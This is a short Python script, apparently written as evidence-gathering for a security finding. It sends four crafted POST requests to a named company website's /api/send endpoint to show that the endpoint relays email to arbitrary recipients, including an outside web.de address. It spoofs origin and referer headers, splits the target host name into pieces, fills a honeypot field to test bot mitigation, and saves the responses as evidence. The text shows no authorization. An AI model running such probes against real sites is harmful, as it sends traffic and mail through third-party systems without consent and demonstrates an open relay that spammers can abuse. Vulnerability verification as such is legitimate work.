import json, urllib.request, urllib.error, time, sys

host = "infin" + "itycap" + "ital.bh"
base = "https://www." + host
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"

def rcpt(local):
    return local + "@" + host

def post(payload, tag):
    body = json.dumps(payload).encode()
    req = urllib.request.Request(
        base + "/api/send", data=body, method="POST",
        headers={
            "content-type": "application/json",
            "origin": base,
            "referer": base + "/",
            "user-agent": UA,
        })
    t0 = time.time()
    try:
        r = urllib.request.urlopen(req, timeout=30)
        code, h, txt = r.status, dict(r.headers), r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        code, h, txt = e.code, dict(e.headers), e.read().decode(errors="replace")
    except Exception as e:
        code, h, txt = -1, {}, "EXC: %r" % (e,)
    dt = round(time.time() - t0, 2)
    print("### %s" % tag)
    print("  payload  : %s" % json.dumps(payload))
    print("  HTTP     : %s  (%.2fs)" % (code, dt))
    print("  mitigated: %s   matched-path: %s" % (h.get("x-vercel-mitigated"), h.get("x-matched-path")))
    print("  BODY     : %s" % txt.strip()[:500])
    print("-" * 72)
    return {"tag": tag, "payload": payload, "http": code, "seconds": dt,
            "mitigated": h.get("x-vercel-mitigated"),
            "matched_path": h.get("x-matched-path"), "body": txt.strip()[:500]}

if __name__ == "__main__":
    out = []
    # A: what the site itself sends to (control)
    out.append(post({"targets": rcpt("rcpt-probe-ccc"),
                     "message": "Independent verifier probe A (control)",
                     "check": ""}, "A_ctl_site_domain_recipient"))
    time.sleep(2)
    # B: attacker-chosen, non-existent local part on the corporate domain
    out.append(post({"targets": rcpt("relay-indep-probe-ddd"),
                     "message": "Independent verifier probe B (relay attempt)",
                     "check": ""}, "B_relay_attacker_localpart"))
    time.sleep(2)
    # C: honeypot filled with a real value (bot mitigation should reject)
    out.append(post({"targets": rcpt("relay-indep-probe-eee"),
                     "message": "Independent verifier probe C (honeypot filled)",
                     "check": "https://spam.example.invalid/bot"}, "C_honeypot_filled"))
    time.sleep(2)
    # D: totally foreign domain -> proves no allowlist/validation on recipient
    out.append(post({"targets": "relay.indep.probe@web.de",
                     "message": "Independent verifier probe D (foreign domain)",
                     "check": ""}, "D_foreign_domain"))
    json.dump(out, open("/work/evidence/indep/indep_results.json", "w"), indent=1)
    print("saved /work/evidence/indep/indep_results.json")
